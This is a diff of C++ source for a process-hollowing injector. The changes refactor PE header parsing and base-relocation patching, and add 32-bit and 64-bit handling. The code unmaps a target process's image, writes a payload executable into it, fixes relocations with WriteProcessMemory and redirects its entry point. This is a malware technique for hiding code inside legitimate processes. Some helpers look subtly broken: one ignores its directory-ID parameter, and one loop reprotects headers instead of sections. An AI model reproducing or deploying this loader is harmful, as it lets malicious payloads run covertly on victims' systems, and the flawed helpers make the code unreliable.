@@ -23,7 +23,7 @@ void ProcessHollowing::hollow()
     PEB targetPEB = ReadProcessPEB(_targetProcessInformation.hProcess);
 
     IMAGE_DOS_HEADER payloadDOSHeader = *((PIMAGE_DOS_HEADER)_payloadBuffer);
-    IMAGE_NT_HEADERS payloadNTHeaders = *((PIMAGE_NT_HEADERS)((LPBYTE)_payloadBuffer + payloadDOSHeader.e_lfanew));
+    IMAGE_NT_HEADERS payloadNTHeaders = *((PIMAGE_NT_HEADERS)(_payloadBuffer + payloadDOSHeader.e_lfanew));
 
     if (0 != NtdllFunctions::_NtUnmapViewOfSection(_targetProcessInformation.hProcess, targetPEB.ImageBaseAddress))
     {
@@ -119,13 +119,13 @@ PBYTE ProcessHollowing::ReadFileContents(const std::string& filePath, DWORD& rea
 void ProcessHollowing::WriteTargetProcessHeaders(PVOID targetBaseAddress, PBYTE sourceFileContents)
 {
     IMAGE_DOS_HEADER sourceDOSHeader = *((PIMAGE_DOS_HEADER)sourceFileContents);
-    IMAGE_NT_HEADERS sourceNTHeaders = *((PIMAGE_NT_HEADERS)((LPBYTE)sourceFileContents + sourceDOSHeader.e_lfanew));
+    IMAGE_NT_HEADERS sourceNTHeaders = *((PIMAGE_NT_HEADERS)(sourceFileContents + sourceDOSHeader.e_lfanew));
 
     std::cout << "Delta: " << (ULONGLONG)targetBaseAddress - sourceNTHeaders.OptionalHeader.ImageBase << std::endl;
 
     sourceNTHeaders.OptionalHeader.ImageBase = (ULONGLONG)targetBaseAddress;
 
-    CopyMemory((LPBYTE)sourceFileContents + sourceDOSHeader.e_lfanew, &sourceNTHeaders, sizeof(sourceNTHeaders));
+    CopyMemory(sourceFileContents + sourceDOSHeader.e_lfanew, &sourceNTHeaders, sizeof(sourceNTHeaders));
     
     std::cout << "Writing headers" << std::endl;
     DWORD oldProtection = 0;
@@ -144,16 +144,16 @@ void ProcessHollowing::WriteTargetProcessHeaders(PVOID targetBaseAddress, PBYTE 
 
     for (int i = 0; i < sourceNTHeaders.FileHeader.NumberOfSections; i++)
     {
-        PIMAGE_SECTION_HEADER currentSection = (PIMAGE_SECTION_HEADER)((LPBYTE)sourceFileContents + sourceDOSHeader.e_lfanew +
+        PIMAGE_SECTION_HEADER currentSection = (PIMAGE_SECTION_HEADER)(sourceFileContents + sourceDOSHeader.e_lfanew +
             sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
         
         printf("Writing %s\n", currentSection->Name);
         NtdllFunctions::_NtWriteVirtualMemory(_targetProcessInformation.hProcess, (PVOID)((LPBYTE)targetBaseAddress +
-            currentSection->VirtualAddress), (PVOID)((LPBYTE)sourceFileContents + currentSection->PointerToRawData),
+            currentSection->VirtualAddress), (PVOID)(sourceFileContents + currentSection->PointerToRawData),
             currentSection->SizeOfRawData, nullptr);
 
         VirtualProtectEx(_targetProcessInformation.hProcess, targetBaseAddress, sourceNTHeaders.OptionalHeader.SizeOfHeaders,
-        SectionCharacteristicsToMemoryProtections(currentSection->Characteristics), &oldProtection);
+            SectionCharacteristicsToMemoryProtections(currentSection->Characteristics), &oldProtection);
     }
 }
 
@@ -191,10 +191,26 @@ void ProcessHollowing::UpdateTargetProcessEntryPoint(ULONGLONG newEntryPointAddr
     }
 }
 
+PIMAGE_DATA_DIRECTORY ProcessHollowing::GetPayloadDirectoryEntry(DWORD directoryID)
+{
+    PIMAGE_DOS_HEADER payloadDOSHeader = (PIMAGE_DOS_HEADER)_payloadBuffer;
+
+    if (_isPayload64Bit)
+    {
+        PIMAGE_NT_HEADERS64 payloadNTHeaders = (PIMAGE_NT_HEADERS64)(_payloadBuffer + payloadDOSHeader->e_lfanew);
+
+        return &(payloadNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]);
+    }
+
+    PIMAGE_NT_HEADERS32 payloadNTHeaders = (PIMAGE_NT_HEADERS32)(_payloadBuffer + payloadDOSHeader->e_lfanew);
+
+    return &(payloadNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]);
+}
+
 PIMAGE_SECTION_HEADER ProcessHollowing::FindTargetProcessSection(const std::string& sectionName)
 {
     IMAGE_DOS_HEADER payloadDOSHeader = *((PIMAGE_DOS_HEADER)_payloadBuffer);
-    IMAGE_NT_HEADERS payloadNTHeaders = *((PIMAGE_NT_HEADERS)((LPBYTE)_payloadBuffer + payloadDOSHeader.e_lfanew));
+    IMAGE_NT_HEADERS payloadNTHeaders = *((PIMAGE_NT_HEADERS)(_payloadBuffer + payloadDOSHeader.e_lfanew));
     BYTE maxNameLengthHolder[IMAGE_SIZEOF_SHORT_NAME + 1] = { 0 };  // According to WinAPI, the name of the section can
                                                                     // be as long as the size of the buffer, which means
                                                                     // it won't always have a terminating null byte, so
@@ -203,7 +219,7 @@ PIMAGE_SECTION_HEADER ProcessHollowing::FindTargetProcessSection(const std::stri
 
     for (i = 0; i < payloadNTHeaders.FileHeader.NumberOfSections; i++)
     {
-        PIMAGE_SECTION_HEADER currentSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)_payloadBuffer + payloadDOSHeader.e_lfanew +
+        PIMAGE_SECTION_HEADER currentSectionHeader = (PIMAGE_SECTION_HEADER)(_payloadBuffer + payloadDOSHeader.e_lfanew +
             sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
 
         if (0 != currentSectionHeader->Name[IMAGE_SIZEOF_SHORT_NAME - 1])
@@ -229,45 +245,67 @@ PIMAGE_SECTION_HEADER ProcessHollowing::FindTargetProcessSection(const std::stri
 
 void ProcessHollowing::RelocateTargetProcess(ULONGLONG baseAddressesDelta, PVOID processBaseAddress)
 {
-    IMAGE_DOS_HEADER payloadDOSHeader = *((PIMAGE_DOS_HEADER)_payloadBuffer);
-    IMAGE_NT_HEADERS payloadNTHeaders = *((PIMAGE_NT_HEADERS)((LPBYTE)_payloadBuffer + payloadDOSHeader.e_lfanew));
-    IMAGE_DATA_DIRECTORY relocData = payloadNTHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+    PIMAGE_DATA_DIRECTORY relocData = GetPayloadDirectoryEntry(IMAGE_DIRECTORY_ENTRY_BASERELOC);
     DWORD dwOffset = 0;
     PIMAGE_SECTION_HEADER relocSectionHeader = FindTargetProcessSection(".reloc");
     DWORD dwRelocAddr = relocSectionHeader->PointerToRawData;
     printf("249 Header name: %s\n", relocSectionHeader->Name);
 
-    while (dwOffset < relocData.Size)
+    while (dwOffset < relocData->Size)
+    {
+        PBASE_RELOCATION_BLOCK pBlockHeader = (PBASE_RELOCATION_BLOCK)&_payloadBuffer[dwRelocAddr + dwOffset];
+
+        DWORD dwEntryCount = CountRelocationEntries(pBlockHeader->BlockSize);
+
+        PBASE_RELOCATION_ENTRY pBlocks = (PBASE_RELOCATION_ENTRY)&_payloadBuffer[dwRelocAddr + dwOffset + sizeof(BASE_RELOCATION_BLOCK)];
+
+        ProcessTargetRelocationBlock(pBlockHeader, pBlocks, (ULONGLONG)processBaseAddress, baseAddressesDelta);
+
+        dwOffset += pBlockHeader->BlockSize;
+    }
+}
+
+void ProcessHollowing::ProcessTargetRelocationBlock(PBASE_RELOCATION_BLOCK baseRelocationBlock, PBASE_RELOCATION_ENTRY blockEntries,
+    ULONGLONG processBaseAddress, ULONGLONG baseAddressesDelta)
+{
+    DWORD entriesAmount = CountRelocationEntries(baseRelocationBlock->BlockSize);
+
+    for (DWORD i = 0; i < entriesAmount; i++)
+    {
+        if (0 != blockEntries[i].Type)
         {
-            PBASE_RELOCATION_BLOCK pBlockHeader = (PBASE_RELOCATION_BLOCK)&_payloadBuffer[dwRelocAddr + dwOffset];
+            DWORD dwFieldAddress = baseRelocationBlock->PageAddress + blockEntries[i].Offset;
 
-            dwOffset += sizeof(BASE_RELOCATION_BLOCK);
-
-            DWORD dwEntryCount = CountRelocationEntries(pBlockHeader->BlockSize);
-
-            PBASE_RELOCATION_ENTRY pBlocks = (PBASE_RELOCATION_ENTRY)&_payloadBuffer[dwRelocAddr + dwOffset];
-
-            for (DWORD i = 0; i < dwEntryCount; i++)
+            if (_isTarget64Bit)
             {
-                dwOffset += sizeof(BASE_RELOCATION_ENTRY);
+                ULONGLONG dwBuffer = 0;
+                ReadProcessMemory(_targetProcessInformation.hProcess, (PVOID)(processBaseAddress + dwFieldAddress),
+                    &dwBuffer, sizeof(dwBuffer), nullptr);
+                
+                dwBuffer += baseAddressesDelta;
 
-                if (0 != pBlocks[i].Type)
+                if (0 == WriteProcessMemory(_targetProcessInformation.hProcess, (PVOID)(processBaseAddress + dwFieldAddress),
+                    &dwBuffer, sizeof(dwBuffer), nullptr))
                 {
-                    DWORD dwFieldAddress = pBlockHeader->PageAddress + pBlocks[i].Offset;
+                    std::cout << "265 Error Code: " << GetLastError() << std::endl;
+                }
+            }
+            else
+            {
+                DWORD dwBuffer = 0;
+                ReadProcessMemory(_targetProcessInformation.hProcess, (PVOID)((DWORD)processBaseAddress + dwFieldAddress),
+                    &dwBuffer, sizeof(dwBuffer), nullptr);
+                
+                dwBuffer += (DWORD)baseAddressesDelta;
 
-                    ULONGLONG dwBuffer = 0;
-                    ReadProcessMemory(_targetProcessInformation.hProcess, (PVOID)((ULONGLONG)processBaseAddress + dwFieldAddress),
-                        &dwBuffer, sizeof(dwBuffer), nullptr);
-                    
-                    dwBuffer += baseAddressesDelta;
-
-                    if (0 == WriteProcessMemory(_targetProcessInformation.hProcess, (PVOID)((ULONGLONG)processBaseAddress + dwFieldAddress), &dwBuffer, sizeof(dwBuffer), nullptr))
-                    {
-                        std::cout << "265 Error Code: " << GetLastError() << std::endl;
-                    }
+                if (0 == WriteProcessMemory(_targetProcessInformation.hProcess, (PVOID)((DWORD)processBaseAddress + dwFieldAddress),
+                    &dwBuffer, sizeof(dwBuffer), nullptr))
+                {
+                    std::cout << "265 Error Code: " << GetLastError() << std::endl;
                 }
             }
         }
+    }
 }
 
 void ProcessHollowing::UpdateBaseAddressInTargetPEB(PVOID processNewBaseAddress)
@@ -319,18 +357,18 @@ ULONG ProcessHollowing::GetProcessSubsystem(HANDLE process)
 
 WORD ProcessHollowing::GetPEFileSubsystem(const PBYTE fileBuffer)
 {
-    IMAGE_DOS_HEADER dosHeader = *((PIMAGE_DOS_HEADER)fileBuffer);
+    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileBuffer;
 
     if (IsPEFile64Bit(fileBuffer))
     {
-        IMAGE_NT_HEADERS64 ntHeaders = *((PIMAGE_NT_HEADERS64)((LPBYTE)fileBuffer + dosHeader.e_lfanew));
+        PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)(fileBuffer + dosHeader->e_lfanew);
         
-        return ntHeaders.OptionalHeader.Subsystem;
+        return ntHeaders->OptionalHeader.Subsystem;
     }
 
-    IMAGE_NT_HEADERS32 ntHeaders = *((PIMAGE_NT_HEADERS32)((LPBYTE)fileBuffer + dosHeader.e_lfanew));
+    PIMAGE_NT_HEADERS32 ntHeaders = (PIMAGE_NT_HEADERS32)(fileBuffer + dosHeader->e_lfanew);
 
-    return ntHeaders.OptionalHeader.Subsystem;
+    return ntHeaders->OptionalHeader.Subsystem;
 }
 
 bool ProcessHollowing::IsProcess64Bit(const HANDLE processHandle)
@@ -379,15 +417,7 @@ bool ProcessHollowing::IsWindows64Bit()
 bool ProcessHollowing::IsPEFile64Bit(const PBYTE fileBuffer)
 {
     IMAGE_DOS_HEADER dosHeader = *((PIMAGE_DOS_HEADER)fileBuffer);
+    PIMAGE_FILE_HEADER fileHeader = (PIMAGE_FILE_HEADER)(fileBuffer + dosHeader.e_lfanew + sizeof(DWORD));
 
-    if (IsPEFile64Bit(fileBuffer))
-    {
-        IMAGE_NT_HEADERS64 ntHeaders = *((PIMAGE_NT_HEADERS64)((LPBYTE)fileBuffer + dosHeader.e_lfanew));
-
-        return IMAGE_FILE_MACHINE_AMD64 == ntHeaders.FileHeader.Machine;
-    }
-
-    IMAGE_NT_HEADERS32 ntHeaders = *((PIMAGE_NT_HEADERS32)((LPBYTE)fileBuffer + dosHeader.e_lfanew));
-
-    return IMAGE_FILE_MACHINE_AMD64 == ntHeaders.FileHeader.Machine;
+    return IMAGE_FILE_MACHINE_AMD64 == fileHeader->Machine;
 }
